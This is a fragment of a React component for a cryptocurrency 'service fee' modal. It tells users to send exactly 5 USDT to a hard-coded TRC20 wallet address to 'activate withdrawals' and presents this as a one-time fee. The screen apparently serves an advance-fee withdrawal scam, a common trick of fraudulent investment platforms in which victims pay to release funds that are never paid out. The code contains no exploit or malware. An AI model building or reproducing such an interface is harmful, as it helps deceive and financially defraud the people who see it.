...
const ServiceFeeModal = ({ onClose, onConfirm }: ServiceFeeModalProps) => {
  ...
  const usdtAddress = "TRX7eWnN2bCNgPLyGTRP8BhHjwDx1DkFHZ"; // Example USDT TRC20 address
        ...
        <CardContent className="space-y-6">
          ...
          <div className="text-center space-y-4">
            <div className="bg-gradient-to-r from-blue-600/20 to-purple-600/20 p-6 rounded-xl border border-blue-500/30">
              ...
              <p className="text-gray-300 text-sm mb-4">
                Send exactly 5 USDT to the address below to activate withdrawals
              </p>
              ...
              <div className="text-xs text-gray-500">
                ⚠️ Only send USDT on TRC20 network. Other tokens or networks will result in loss of funds.
              </div>
            </div>
          </div>
          ...
          <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-4">
            <p className="text-amber-300 text-sm">
              <strong>Important:</strong> This is a one-time fee. After payment verification, 
              all future withdrawals will only incur standard network fees.
            </p>
          </div>
